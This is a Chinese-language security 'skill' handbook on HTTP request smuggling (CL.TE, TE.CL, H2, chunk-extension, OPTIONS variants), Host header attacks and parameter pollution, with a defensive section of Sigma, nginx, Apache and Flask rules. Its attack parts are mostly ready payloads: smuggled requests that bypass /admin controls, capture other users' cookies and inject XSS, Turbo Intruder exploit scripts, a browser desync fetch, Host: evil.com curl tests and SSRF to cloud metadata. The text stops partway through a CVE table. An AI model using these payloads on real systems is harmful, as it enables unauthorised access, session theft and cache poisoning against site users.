---
name: web-request-smuggling
description: >
  全面覆盖 HTTP 请求走私（Request Smuggling）、HTTP Host 头攻击、
  HTTP 参数污染（HPP）的识别、利用、检测和修复。
  涵盖 CL.TE / TE.CL / TE.TE / H2.CL / H2.TE 所有走私变体，
  包含前端/后端不一致分析、计时差异检测法、走私链利用（绕过认证、缓存投毒、XSS、重置其他用户密码），
  Host 头攻击（密码重置投毒、SSRF、缓存投毒、虚拟主机绕过），
  HPP 参数污染（WAF 绕过、认证绕过、逻辑漏洞），
  以及防御侧的请求规范化、Host 头验证、参数解析统一。
domain: cybersecurity
subdomain: web-security
tags: [request-smuggling, http-smuggling, host-header, parameter-pollution, cl-te, te-cl, h2-smuggling, owasp]
version: 2.0.0
---

# HTTP 请求走私 / Host 头 / 参数污染 — 完整攻防手册

## 适用场景

- Web 应用部署在反向代理/CDN/WAF/负载均衡器之后
- 前端服务器和后端服务器对 Content-Length / Transfer-Encoding 解析不一致
- 应用使用 Host 头构建 URL（密码重置链接、缓存键、SSRF 目标）
- WAF 基于参数解析进行过滤，但与后端解析不一致
- 渗透测试中需要绕过前端安全控制

**不适用**：单一服务器架构（无代理层）、纯 TLS 层攻击

---

## Part A：攻击方法论

### 1. HTTP 请求走私

#### 1.1 原理与分类

```
请求走私发生条件：
前端服务器（反向代理/CDN）和后端服务器对同一个 HTTP 请求的边界判断不一致

┌─────────┐     ┌──────────┐     ┌─────────┐
│  Client  │────▶│  Frontend │────▶│ Backend │
│          │     │ (Proxy/CDN)│    │ (App)   │
└─────────┘     └──────────┘     └─────────┘
               使用 CL 或 TE      使用 TE 或 CL
               判断请求边界        判断请求边界
               ↓ 不一致 ↓
               → 后端将第二个请求的一部分误认为新请求

走私类型矩阵：
| 类型  | 前端使用 | 后端使用 | 利用条件                    |
|-------|---------|---------|-----------------------------|
| CL.TE | CL      | TE      | 前端处理 CL，后端优先 TE    |
| TE.CL | TE      | CL      | 前端处理 TE，后端优先 CL    |
| TE.TE | TE      | TE      | TE 头混淆/模糊处理差异      |
| H2.CL | HTTP/2  | H1 CL   | H2→H1 降级时走私           |
| H2.TE | HTTP/2  | H1 TE   | H2→H1 降级时走私           |
```

#### 1.2 CL.TE 走私

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

```
前端看到 Content-Length: 13 → 读取 "0\r\n\r\nSMUGGLED" → 转发全部
后端看到 Transfer-Encoding: chunked → 第一个 chunk 大小为 0 → 请求结束
"SMUGGLED" 被留在连接缓冲区 → 成为下一个请求的开头

结果：下一个用户的请求以 "SMUGGLED" 开头 → 解析错误或被注入
```

#### 1.3 TE.CL 走私

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

```
前端看到 Transfer-Encoding: chunked → 读取完整的 chunked 消息（8 字节 chunk + 0 结束）
后端看到 Content-Length: 3 → 只读取 "8\r\n" → 剩余留在缓冲区
剩余数据 "SMUGGLED\r\n0\r\n\r\n" 被当作下一个请求
```

#### 1.4 TE.TE 混淆

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

8
SMUGGLED
0

```

```
前端看到第一个 TE: chunked → 正常处理 chunked
后端可能忽略第一个 TE（看到第二个 TE: x 不是有效值）→ 回退到 CL
→ 产生 TE.CL 效果

混淆变体：
Transfer-Encoding: chunked        ← 标准
Transfer-Encoding: chunked\r\n    ← 尾部空白
Transfer-encoding: chunked        ← 大小写
Transfer Encoding: chunked        ← 无连字符
X-Transfer-Encoding: chunked      ← 前缀
Transfer-Encoding: chunked, identity  ← 多值
Transfer-Encoding: \tchunked      ← 前导制表符
```

#### 1.5 自动化检测（计时法）

```bash
# 使用 smuggler.py 自动检测
# https://github.com/defparam/smuggler
python3 smuggler.py -u https://target.com

# 使用 HTTP Request Smuggler（Burp Suite 扩展）
# 右键 → HTTP Request Smuggler → Active Scan

# 手动计时检测 CL.TE
# 发送两次，观察响应时间差异
# 正常请求 → 快速响应
# 走私请求 → 后端等待更多数据（慢）

# 使用 Burp Repeater / Turbo Intruder
# 发送 CL.TE 测试 payload：
POST / HTTP/1.1
Host: target.com
Content-Length: 100
Transfer-Encoding: chunked

0

X
# 如果后端等待（超时），说明 CL.TE 可能存在
# 因为后端用 TE 处理完第一个请求后
# "X" 被当作新请求，后端等待剩余内容
```

#### 1.6 走私利用场景

```
利用 1：绕过前端访问控制
# 前端验证路径 /admin → 拒绝
# 通过走私将真实请求注入
POST / HTTP/1.1
Host: target.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

利用 2：投毒其他用户请求
# 走私的请求成为其他用户请求的前缀
# 使其他用户收到恶意响应
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: target.com
Content-Type: text/html

<script>alert('XSS via smuggling')</script>

利用 3：窃取其他用户请求
# 走私一个不完整的请求，后端将用户的真实请求作为参数值捕获
POST /capture HTTP/1.1
Host: target.com
Content-Length: 300
Transfer-Encoding: chunked

0

POST /capture HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

data=
# 下一个用户的完整请求（含 Cookie/Token）成为 data 参数的值

利用 4：Web 缓存投毒
# 走私一个请求使缓存服务器存储恶意响应
# 后续用户访问相同路径时收到恶意缓存内容

利用 5：重置其他用户密码
# 走私 POST /forgot-password
# 后端将走私的请求关联到攻击者控制的账户
# 密码重置链接发送到攻击者邮箱
```

#### 1.7 HTTP/2 走私

```
# H2.CL 走私
# HTTP/2→HTTP/1 降级时，H2 的 content-length 不被正确验证
# 攻击者可以在 H2 帧中注入 HTTP/1 请求行

# H2.TE 走私
# 类似原理，利用 H2 连接复用 + TE 处理差异

# H2C 走私（HTTP/2 明文升级）
# 某些代理不支持 H2C 但会转发 Upgrade 头
# 攻击者通过 Upgrade: h2c 建立直接的 H2C 连接
# 绕过前端代理的检查
```

### 2. HTTP Host 头攻击

#### 2.1 漏洞识别

```bash
# 基本测试 — 修改 Host 头
curl -H "Host: evil.com" https://target.com/
curl -H "Host: target.com.evil.com" https://target.com/
curl -H "Host: evil.target.com" https://target.com/

# 双 Host 头（某些服务器取第二个）
curl -H "Host: target.com" -H "Host: evil.com" https://target.com/

# 绝对 URI（覆盖 Host）
curl https://target.com/ -H "Host: evil.com" --request-target "https://evil.com/"

# Host 头端口注入
curl -H "Host: target.com:80@evil.com" https://target.com/
```

#### 2.2 利用场景

```
攻击 1：密码重置投毒
# 应用使用 Host 头构建密码重置链接
# 正常: https://target.com/reset?token=abc
# 被投毒: https://evil.com/reset?token=abc
# 用户点击重置链接 → Token 泄露到 evil.com

# 测试步骤：
1. 注册/登录目标网站
2. 请求密码重置
3. 修改 Host 头为 attacker.com
4. 检查收到的重置邮件中的链接域名

攻击 2：Web 缓存投毒
# 如果缓存服务器使用 Host 头作为缓存键
# 攻击者投毒 Host → 缓存恶意响应
# 其他用户访问时收到恶意内容

攻击 3：SSRF
# 后端使用 Host 头构建内部请求
# Host: 169.254.169.254 → 访问 AWS 元数据

攻击 4：虚拟主机路由绕过
# 后端使用 Host 头路由到不同应用
# 修改 Host 头访问受限的内部应用

攻击 5：SQL 注入
# 某些应用将 Host 头值存入数据库
# Host: target.com' OR 1=1--
```

### 3. HTTP 参数污染（HPP）

#### 3.1 参数解析差异

```
# 不同技术栈对重复参数的处理
| 后端技术       | ?a=1&a=2       | 取值      |
|---------------|----------------|-----------|
| PHP           | a=2            | 最后一个  |
| ASP.NET       | a=1,2          | 逗号连接  |
| Java Servlet  | a=1            | 第一个    |
| Node.js/Express| a=["1","2"]   | 数组      |
| Python Flask  | a=1            | 第一个    |
| Ruby Rails    | a=2            | 最后一个  |
| Apache/Tomcat | a=1            | 第一个    |
| Nginx         | a=2            | 最后一个  |

# 利用：前端 WAF 和后端对参数的解析不一致
```

#### 3.2 HPP 利用场景

```
利用 1：WAF 绕过
# WAF 检查第一个参数，后端取最后一个
# ?search=normal&search=<script>alert(1)</script>
# WAF 看到 search=normal → 放行
# 后端（PHP）取 search=<script>alert(1)</script> → XSS

利用 2：认证绕过
# 某些框架对重复参数取第一个
# ?user=victim&user=attacker
# 认证中间件检查第一个 (user=victim) → 允许
# 业务逻辑取最后一个 (user=attacker) → 操作 attacker 的数据

利用 3：预签名 URL 伪造
# AWS S3 预签名 URL 使用参数签名
# 添加额外参数可能导致签名失效或绕过
# ?AWSAccessKeyId=...&Signature=...&user=admin

利用 4：JSON 参数污染
# JSON body 中的重复键
{"user": "victim", "user": "admin"}
# 不同 JSON 解析器行为不同（取第一个/最后一个/报错）

利用 5：URL 编码绕过
# %26 → & (URL 解码后变成新的参数分隔符)
# ?redirect=https%3A%2F%2Fsafe.com%26user%3Dadmin
# 解码后: ?redirect=https://safe.com&user=admin
```

---

## Part B：检测与防御

### 4. 请求走私检测

#### 4.1 被动检测指标

```yaml
# Sigma 规则 — 请求走私指标
title: HTTP 请求走私可疑指标
status: experimental
logsource:
    category: webserver
detection:
    duplicate_te:
        c-request|contains:
            - 'Transfer-Encoding: chunked\r\nTransfer-Encoding'
    conflicting_headers:
        c-request|contains:
            - 'Transfer-Encoding'
        condition_and:
            c-request|contains:
                - 'Content-Length'
    malformed_te:
        c-request|regex:
            - 'Transfer-Encoding:\s*(x|identity|compress)'
    h2c_upgrade:
        c-request|contains:
            - 'Upgrade: h2c'
            - 'HTTP2-Settings:'
    condition: duplicate_te or (conflicting_headers and malformed_te) or h2c_upgrade
level: high
```

#### 4.2 差异响应检测

```bash
# 使用差异响应确认走私
# 发送两个不同的请求，如果第二个请求的响应不同，说明走私成功

# 步骤 1：走私一个请求到不存在的路径
POST / HTTP/1.1
Host: target.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /404pathTest123 HTTP/1.1
Host: target.com

# 步骤 2：立即发送正常请求
GET / HTTP/1.1
Host: target.com

# 如果步骤 2 的响应是 404（而非 200），说明走私成功
# 后端将走私的 GET /404pathTest123 作为第一个请求处理
# 正常的 GET / 作为第二个请求
```

### 5. 防御措施

#### 5.1 请求走私防御

```nginx
# Nginx — 请求规范化配置

# 1. 配置为始终使用 HTTP/1.1 与后端通信
# 确保 proxy_http_version 和前后端解析一致
proxy_http_version 1.1;

# 2. 移除不必要的 Transfer-Encoding
proxy_set_header Transfer-Encoding "";

# 3. 前端代理配置 — 拒绝有歧义的请求
# 检测同时存在 CL 和 TE 的情况
map $request_body $has_ambiguity {
    default 0;
    # 通过 Lua 或 njs 进行更精确的检测
}

# 4. HAProxy 配置（推荐用于防走私）
# http-request replace-header Transfer-Encoding "chunked" ""
# 或拒绝 chunked 编码
# http-request deny if { req.hdr(Transfer-Encoding) -m found }
```

```apache
# Apache — 请求走私防御
# 使用 mod_rewrite 规范化请求
RewriteEngine On
# 拒绝包含多个 Transfer-Encoding 头的请求
RewriteCond %{HTTP:Transfer-Encoding} ^.*,.+$
RewriteRule .* - [F]

# 使用 mod_headers 移除冲突头
RequestHeader unset Transfer-Encoding
```

```
架构层面防御：
1. 前后端使用相同的 HTTP 解析库
2. 前端代理在转发前验证请求合法性
3. 前端代理添加 X-Forwarded-Host / X-Forwarded-Proto
4. 后端不直接信任 Host 头，使用配置的域名
5. 使用 HTTP/2 端到端（避免 H2→H1 降级）
6. 关闭 TCP 连接复用（性能换安全，极端情况）
```

#### 5.2 Host 头防御

```nginx
# Nginx — 严格 Host 验证
server {
    # 只响应特定的 Host
    server_name target.com;

    # 拒绝不匹配的 Host
    if ($host != "target.com") {
        return 444;  # Nginx 特殊码，直接关闭连接
    }
}

# 或使用正则白名单
server {
    server_name ~^(www\.)?target\.com$;
    if ($host !~* ^(www\.)?target\.com$) {
        return 444;
    }
}
```

```python
# 应用层 Host 头验证（Python Flask）
from flask import request, abort

ALLOWED_HOSTS = ['target.com', 'www.target.com', 'app.target.com']

@app.before_request
def validate_host():
    host = request.headers.get('Host', '').split(':')[0]
    if host not in ALLOWED_HOSTS:
        abort(403)
```

#### 5.3 HPP 防御

```python
# 统一参数处理策略
# 1. 明确指定取第一个还是最后一个参数
# 2. 拒绝重复参数
from flask import request

@app.route('/api/search')
def search():
    # 获取参数，明确只取第一个
    query = request.args.get('q')  # Flask 默认取第一个
    # 或拒绝重复
    if len(request.args.getlist('q')) > 1:
        abort(400, 'Duplicate parameter not allowed')
```

```
HPP 防御最佳实践：
1. 前端 WAF 和后端使用相同的参数解析逻辑
2. 对所有参数输入进行规范化处理
3. 拒绝包含重复键的请求
4. 对 URL 编码进行规范化（解码后重新编码）
5. 日志记录所有参数值（不仅是解析后的值）
```

---

## 速查表

### 请求走私类型与检测矩阵

| 类型 | 前端 | 后端 | 检测方法 | 利用难度 |
|------|------|------|---------|---------|
| CL.TE | CL | TE | 计时法（慢响应） | 中 |
| TE.CL | TE | CL | 差异响应（404） | 中 |
| TE.TE | TE | TE | TE 混淆变体 | 高 |
| H2.CL | HTTP/2 | H1+CL | H2 帧分析 | 高 |
| H2.TE | HTTP/2 | H1+TE | H2 帧分析 | 高 |
| H2C | H2 Upgrade | H2C | Upgrade 头检测 | 中 |

### Host 头攻击类型速查

| 攻击类型 | 前提条件 | 危害 | 检测方法 |
|---------|---------|------|---------|
| 密码重置投毒 | Host 头构建 URL | 凭据窃取 | 修改 Host 请求重置 |
| 缓存投毒 | Host 头参与缓存键 | 存储型 XSS | 缓存键分析 |
| SSRF | Host 头用于内部请求 | 内网访问 | Host: 169.254.169.254 |
| SQL 注入 | Host 头存入数据库 | 数据泄露 | Host: ' OR 1=1-- |
| 虚拟主机绕过 | 基于名称的虚拟主机 | 访问受限应用 | 内部 Host 名 |

### HPP 参数解析差异速查

| 参数 | PHP | ASP.NET | Java | Node.js | Python |
|------|-----|---------|------|---------|--------|
| `?a=1&a=2` | a=2 | a=1,2 | a=1 | ["1","2"] | a=1 |
| `?a=1%26a=2` | a=1&a=2 | a=1&a=2 | a=1&a=2 | a=1&a=2 | a=1&a=2 |
| `?a[]=1` | 数组 | a[]=1 | a[]=1 | {"a":["1"]} | a[]=1 |
| WAF 绕过 | 取最后 | 逗号连接 | 取第一 | 数组 | 取第一 |

---

## MITRE ATT&CK 映射

| Tactic | Technique ID | Technique Name | 本 Skill 覆盖 |
|--------|-------------|----------------|---------------|
| Initial Access | T1190 | Exploit Public-Facing Application | 请求走私利用 |
| Credential Access | T1539 | Steal Web Session Cookie | 请求窃取 |
| Defense Evasion | T1027 | Obfuscated Files | HPP 参数混淆 |
| Defense Evasion | T1211 | Exploitation for Defense Evasion | 走私绕过 WAF |
| Lateral Movement | T1090 | Proxy | H2C 代理穿透 |
| Persistence | T1505 | Server Software Component | 缓存投毒 |

---

## 前置条件

- 深入理解 HTTP/1.1 和 HTTP/2 协议（请求行、头部、body 解析）
- 理解 Content-Length 和 Transfer-Encoding: chunked 机制
- Burp Suite（Repeater、Turbo Intruder、Scanner 扩展）
- 理解反向代理/CDN 架构
- 目标应用存在多层代理架构

---

## Part C：2025-2026 更新

### 6. HTTP/2 走私深度解析

#### 6.1 H2 走私原理

```
HTTP/2 本身通过显式 DATA 帧长度字段避免了经典 CL/TE 走私，
但当前端代理将 HTTP/2 降级为 HTTP/1.1 转发给后端时，
H2 的二进制帧边界信息丢失，重新引入解析不一致风险。

┌──────────┐     ┌──────────────┐     ┌──────────┐
│  Client   │────▶│  H2 Frontend │────▶│ H1 Backend│
│ (HTTP/2)  │     │  (降级转换)   │     │ (HTTP/1.1)│
└──────────┘     └──────────────┘     └──────────┘
  H2 二进制帧      生成 H1 文本         按 CL/TE 解析
  无 CL/TE 问题    可能注入错误头        产生不一致
```

#### 6.2 H2.CL 走私

```
前端（HTTP/2）使用 H2 内置帧长度判断边界
降级为 HTTP/1.1 时，前端根据 DATA 帧长度生成 Content-Length
如果攻击者通过 H2 伪头部注入额外的 Content-Length，
后端可能使用注入的 CL 值而非帧长度

攻击示例（Turbo Intruder / Burp）：
  :method POST
  :path /
  :scheme https
  :authority target.com
  content-length 0        ← H2 头部（攻击者注入）
  
  GET /admin HTTP/1.1\r\n
  Host: target.com\r\n
  \r\n                     ← DATA 帧中的走私 payload

前端：H2 帧长度 = 整个 DATA 帧大小 → 正常转发
后端：Content-Length: 0 → 认为 POST body 为空
       剩余数据被当作新请求 → 走私成功
```

#### 6.3 H2.TE 走私

```
前端在 H2→H1 降级时将 H2 头部映射为 HTTP/1.1 头部
如果攻击者在 H2 头部中包含 transfer-encoding: chunked
某些前端代理会原样转发该头部给后端

后端看到 Transfer-Encoding: chunked
但前端使用 H2 帧边界判断请求结束
→ 经典 TE.CL 走私效果

攻击示例：
  :method POST
  :path /
  :scheme https
  :authority target.com
  transfer-encoding chunked    ← H2 头部中的 TE

  DATA 帧中包含精心构造的 chunked payload
```

#### 6.4 H2.CLEN (Content-Length Manipulation)

```
H2CLENGTH 攻击（James Kettle / PortSwigger Research）：
利用 HTTP/2 允许在 HEADERS 帧中包含 content-length 伪头部的特性

变体 1：H2 CL 冲突
  - H2 HEADERS 帧中包含 content-length: 5
  - 但 DATA 帧实际发送 100 字节
  - 不同前端对这种不一致的处理方式不同

变体 2：CRLF 注入
  - HTTP/2 头部值中包含 \r\n 字符
  - 降级为 HTTP/1.1 时，\r\n 被解释为头部分隔符
  - 攻击者可以注入任意 HTTP/1.1 头部
  :path /anything
  foo: bar\r\nTransfer-Encoding: chunked
  → 降级后生成合法的 TE 头部

变体 3：伪头部滥用
  - :path 伪头部中包含空格或特殊字符
  - :authority 伪头部中注入端口或凭据
  - 降级时被错误解析
```

#### 6.5 Request Tunneling（请求隧道）

```
请求隧道是一种更高级的走私利用方式：
通过走私一个完整的请求，让后端在同一个 TCP 连接上
同时处理两个独立的请求-响应交互

利用场景：
1. 绕过前端认证：走私一个带认证头的请求
   前端代理认为只有一个请求（已认证用户的正常请求）
   后端实际上处理了两个请求（走私的请求无需前端认证）

2. 盲走私（Blind Smuggling）：
   走私的请求触发后端行为，但响应不可见
   通过侧信道（时间差异、状态变化）确认利用成功

3. WebSocket 隧道：
   通过走私建立 WebSocket 连接
   绕过前端对 WebSocket 升级的限制

Turbo Intruder 利用脚本示例（H2.CL 隧道）：
```

```python
# Turbo Intruder 脚本 — H2.CL Request Tunneling
# 来源: PortSwigger Research
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target,
                           concurrentConnections=1,
                           engine=BURP2  # 使用 HTTP/2
                           )
    
    # 走私请求：前端认为 body 很长，后端按 CL=0 处理
    attack = '''POST / HTTP/2
Host: %s
Content-Length: 0

GET /admin HTTP/1.1
Host: %s
Content-Length: 100

''' % (target.host, target.host)
    
    engine.queue(attack)
    
    # 发送正常请求来接收走私响应
    engine.queue('''GET / HTTP/2
Host: %s
''' % target.host)

def handleResponse(req, interesting):
    table.add(req)
```

### 7. HTTP Desync 攻击（浏览器攻击）

#### 7.1 浏览器驱动的 Desync

```
传统走私：攻击者使用 Burp Suite 等工具直接发送畸形请求
Desync 攻击：攻击者通过普通网页（JavaScript fetch/XHR）
             诱导受害者浏览器发送触发不一致的请求

这是 James Kettle (PortSwigger) 在 2022 年 DEF CON 上
提出的攻击类别，代表了走私攻击的新方向

浏览器攻击的优势：
1. 无需特殊工具 — 普通浏览器即可触发
2. 绕过 IP 限制 — 由受害者浏览器发起
3. 利用浏览器特有的连接处理行为
4. 可以结合 CSRF/XSS 形成攻击链
```

#### 7.2 CL.0 Desync

```
CL.0 是 Desync 攻击的一种变体：
前端看到 Content-Length: 0 → POST body 为空
后端忽略 CL 头部 → 继续读取 body

攻击前提：
- 后端服务器对某些路径不解析 Content-Length
- 后端路径处理行为不一致（某些路径解析 CL，某些不解析）

攻击流程：
1. 攻击者构造恶意网页
2. 受害者浏览器访问该页面
3. JavaScript 发送 POST 请求，CL=0 但实际包含 body
4. 前端认为 body 为空，立即完成请求
5. 后端继续读取 body 数据
6. body 中的数据被当作下一个请求
```

```javascript
// 浏览器端 Desync 攻击示意
// 攻击者控制的恶意页面
fetch('https://target.com/vulnerable-endpoint', {
    method: 'POST',
    headers: {
        'Content-Length': '0',
        'Content-Type': 'text/plain'
    },
    body: 'GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n',
    // 注意：实际利用需要更复杂的技巧
    // 因为浏览器通常会覆盖 Content-Length
}).then(r => r.text()).then(console.log);
```

#### 7.3 浏览器连接复用攻击

```
浏览器为性能优化会复用 HTTP/2 连接和 HTTP/1.1 keep-alive 连接
攻击者可以利用连接复用实现跨域走私

攻击步骤：
1. 攻击者页面 A 建立 HTTPS 连接到 target.com
2. 通过 WebSocket 或 fetch 保持连接活跃
3. 在同一连接上注入恶意数据
4. 受害者页面 B 的请求通过同一连接发送
5. 注入的数据影响受害者请求的解析

危害：
- 跨域请求窃取
- 绕过 Same-Origin Policy（利用连接级别混淆）
- 受害者 Cookie/Token 窃取
```

### 8. Turbo Intruder 自动化利用

#### 8.1 Turbo Intruder 概述

```
Turbo Intruder 是 PortSwigger 开发的 Burp Suite 扩展
专门用于高速 HTTP 请求走私测试和利用

核心优势：
1. 精确的 TCP 连接控制 — 可在同一连接上发送多个请求
2. HTTP/2 原生支持 — 可直接构造 H2 帧
3. 高并发 — 支持竞态条件利用
4. Python 脚本驱动 — 灵活编写攻击逻辑

安装：Burp Suite → BApp Store → Turbo Intruder
```

#### 8.2 常用攻击脚本

```python
# 脚本 1: CL.TE 计时检测
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target,
                           concurrentConnections=1,
                           engine=BURP2)
    
    # 测试 CL.TE
    attack = '''POST / HTTP/1.1
Host: %s
Content-Length: 100
Transfer-Encoding: chunked

0

X''' % target.host
    
    for i in range(10):
        engine.queue(attack)
        # 正常请求
        engine.queue('''GET / HTTP/1.1
Host: %s

''' % target.host)

def handleResponse(req, interesting):
    # 检测异常延迟或异常响应
    if '404' in req.response or req.time > 5000:
        table.add(req)
```

```python
# 脚本 2: H2.CL 走私利用
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target,
                           concurrentConnections=1,
                           engine=BURP2)
    
    attack = '''POST / HTTP/2
Host: %s
Content-Length: 0

GET /admin HTTP/1.1
Host: %s

''' % (target.host, target.host)
    
    engine.queue(attack)
    engine.queue('''GET / HTTP/2
Host: %s
''' % target.host)

def handleResponse(req, interesting):
    table.add(req)
```

```python
# 脚本 3: 窃取其他用户请求
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target,
                           concurrentConnections=1,
                           engine=BURP2)
    
    # 走私一个不完整的请求，捕获下一个用户的请求
    attack = '''POST /capture HTTP/1.1
Host: %s
Content-Length: 300
Transfer-Encoding: chunked

0

POST /capture HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded
Content-Length: 800

data=''' % (target.host, target.host)
    
    engine.queue(attack)

def handleResponse(req, interesting):
    if len(req.response) > 0:
        table.add(req)
```

#### 8.3 检测策略总结

```
Turbo Intruder 检测流程：

Step 1: 发送 CL/TE 冲突请求，观察时间差异
  CL.TE → 后端等待更多数据 → 超时/慢响应
  TE.CL → 响应可能包含异常数据

Step 2: 发送差异响应测试
  走私 GET /不存在的路径 → 下一个请求收到 404
  对比正常请求 → 确认走私

Step 3: H2 降级测试
  使用 BURP2 引擎发送 HTTP/2 请求
  包含 CL=0 或 TE 头部
  观察后端行为差异

Step 4: 确认可利用性
  尝试走私实际攻击 payload（绕过认证/投毒缓存）
```

### 9. Chunk Extension Smuggling（Chunk 扩展走私）

#### 9.1 全新攻击类别

```
2025年由 Imperva 研究团队和独立研究员 Jeppe (w4ke) 分别发现：
利用 chunked 编码中 chunk-size 行的扩展部分（chunk-extension）
在不同服务器间的解析差异实现走私。

RFC 7230 定义 chunked 编码格式：
  chunk-size [ chunk-ext ] CRLF chunk-data CRLF
                         ↑
                     这部分被不同服务器解析方式不同

示例 payload：
  5;ext=value\r\n
  hello\r\n
  0\r\n
  \r\n

攻击变体 1：chunk-extension 引号字符串解析差异
  5;ext="value\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"\r\n
  hello\r\n
  0\r\n
  \r\n
  ↑ 前端服务器认为引号内是 chunk-ext 值的一部分
  ↑ 后端服务器可能在引号前截断 → 剩余被当作新请求

攻击变体 2：裸 LF 作为 chunk 行终止符（Funky Chunks）
  5\n
  hello\n
  0\n
  \n
  ↑ RFC 要求 CRLF (\r\n)，但很多实现接受 bare LF (\n)
  ↑ 前端严格用 CRLF → 后端宽松接受 LF → 解析不一致

影响范围（2025-2026 已确认）：
  - ASP.NET Core Kestrel (CVE-2025-55315)
  - Eclipse Jetty (GHSA-355h-qmc2-wpwf)
  - Netty (CVE-2025-58056)
  - Go net/http (CVE-2025-22871)
  - Akamai Ghost (CVE-2025-66373)
```

#### 9.2 Funky Chunks 研究详解（w4ke, 2025年6月）

```
来源：https://w4ke.info/2025/06/18/funky-chunks.html
发现者：Jeppe Bonde Weikop

核心发现：
HTTP/1.1 chunked 传输编码中，chunk-size 行的终止符 RFC 要求 CRLF
但大量实现在不同程度上容忍 bare LF

严格性光谱：
  ┌──────────────────────────────────────────────┐
  │ 严格（仅 CRLF）          宽松（接受 bare LF）│
  │ Nginx ── HAProxy ── Go ── Kestrel ── Netty  │
  └──────────────────────────────────────────────┘

当严格解析器在前端、宽松解析器在后端时：
  前端将 bare LF 视为 chunk-size 行的一部分（非终止符）
  后端将 bare LF 视为 chunk-size 行的终止符
  → 请求边界判断不一致 → 走私

关键影响 CVE 链：
  CVE-2025-22871 (Go)     → Go 1.24.2 / 1.23.8 修复
  CVE-2025-55315 (Kestrel) → ASP.NET Core 6-10，$10K 赏金
  CVE-2025-58056 (Netty)   → Netty 4.1.124.Final 修复
```

#### 9.3 Chunk Extension 实战 Payload

```http
# Chunk Extension 引号字符串走私（Jetty 变体）
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

5;foo="bar
GET /admin HTTP/1.1
Host: target.com

"
hello
0

# Chunk Extension 分号分隔差异
5;foo=bar;baz=qux
hello
0

# 前端可能解析到第一个分号截断
# 后端可能解析完整扩展 → body 起始位置不同
```

### 10. OPTIONS + Body 走私（全新变体）

```
来源：CVE-2025-54142 (Akamai Ghost, 2025年7月)
发现者：Akamai InfoSec 团队

RFC 7231 允许 OPTIONS 请求携带 entity body
但大多数代理/CDN 默认忽略 OPTIONS 请求的 body

攻击原理：
  1. 攻击者发送 OPTIONS 请求，携带精心构造的 body
  2. CDN 代理层忽略 OPTIONS 的 body → 只转发请求行和头部
  3. 后端源站处理完整的 OPTIONS 请求（包括 body）
  4. body 中隐藏的 HTTP 请求被后端解析为独立请求

Payload 示例：
OPTIONS / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

GET /admin/deleteUser?user=victim HTTP/1.1
Host: target.com
Cookie: admin-session=xxx

影响：Akamai Ghost (2025-07-21 前版本)
修复：Akamai 已部署自动修复
```

### 11. Black Hat 2025: "HTTP/1.1 Must Die — The Desync Endgame"

```
来源：DEF CON / Black Hat USA 2025
演讲者：James Kettle (PortSwigger Research) 等研究者

核心论点：
1. HTTP/1.1 走私攻击面远未被穷尽
2. 即使在 hardened 目标上仍然可行
3. 引入超越经典 CL.TE/TE.CL 的新攻击类别
4. 主张 HTTP/1.1 最终应被淘汰以根除走私面

研究发现摘要：
- 即使 CDN/WAF 等防护已趋完善，新型 desync 变体仍可绕过
- 超过 $200,000 赏金从这项研究中产生
- 受影响目标包括主要 CDN 提供商和大型组织
- 影响数百万网站

2025 年趋势总结：
- Chunk extension smuggling 成为新的主要攻击面
- Bare LF / CRLF 宽松性差异成为流行利用路径
- 非标准 HTTP 方法（OPTIONS、TRACE）的 body 处理差异成为新变体
- WSGI/ASGI 服务器（Gunicorn、uvicorn）成为新目标
```

### 12. WSGI/Python 请求走私研究

```
来源：奇安信技术研究院 (2025年1月) + Emile Fugulin (Medium)
     + Gunicorn 漏洞披露

核心问题：
WSGI 规范要求服务器自行处理 hop-by-hop 头部（如 Transfer-Encoding）
但不同 WSGI 服务器对 TE 的处理方式不一致

CVE 链（Python/WSGI 生态）：
┌──────────────────┬────────────────────┬──────────────────────────────┐
│ CVE              │ 组件               │ 问题                          │
├──────────────────┼────────────────────┼──────────────────────────────┤
│ CVE-2025-58068   │ Gunicorn           │ HTTP 请求走私（PR #3445 修复） │
│ CVE-2024-6827    │ Gunicorn           │ TE 头验证不当                  │
│ CVE-2024-1135    │ Gunicorn           │ HTTP 请求走私                  │
│ CVE-2023-41419   │ Gunicorn (gevent)  │ HTTP 请求走私（需 gevent≥24.10.1）│
└──────────────────┴────────────────────┴──────────────────────────────┘

攻击场景（AWS + Python 架构）：
  Client → AWS ALB (前端) → Nginx → Gunicorn (后端)
  
  AWS ALB 对 CL/TE 处理较严格
  但 Gunicorn 的 TE 解析可能不一致
  → ALB 和 Gunicorn 之间的 Nginx 可引入解析差异

防御建议：
  1. Gunicorn 升级到最新版本
  2. Nginx 前端配置 proxy_set_header Transfer-Encoding ""
  3. 使用 ASGI 替代方案（Uvicorn/Hypercorn）时同样注意 TE 处理
```

### 13. 2025-2026 综合 CVE 速查（扩展版）

```
┌──────────────────┬──────┬───────────────────────┬──────────────────────────────┬─────────┐
│ CVE 编号          │ 年份  │ 影响组件               │ 描述                          │ 严重度   │
├──────────────────┼──────┼───────────────────────┼──────────────────────────────┼─────────┤
│ CVE-2025-55315   │ 2025 │ ASP.NET Core Kestrel  │ Chunk扩展走私($10K赏金)       │ Critical │
│ CVE-2025-22871   │ 2025 │ Go net/http           │ Bare LF chunk行终止符走私     │ 中危     │
│ CVE-2025-58056   │ 2025 │ Netty                 │ Bare LF chunk行终止符走私     │ 中危     │
